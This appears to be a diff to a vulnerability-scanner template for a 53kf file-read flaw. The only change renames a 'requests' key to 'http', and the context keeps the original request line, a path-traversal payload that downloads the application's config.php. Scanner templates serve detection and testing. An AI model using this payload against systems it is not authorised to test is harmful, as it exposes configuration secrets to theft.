@@ -8,7 +8,7 @@ info:
   reference: http://wooyun.org/bugs/wooyun-2014-086882
   tags: 53kf,file_read
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/new/client.php?m=download&a=downloadFile&file=..%2F../new/Client/Conf/config.php"
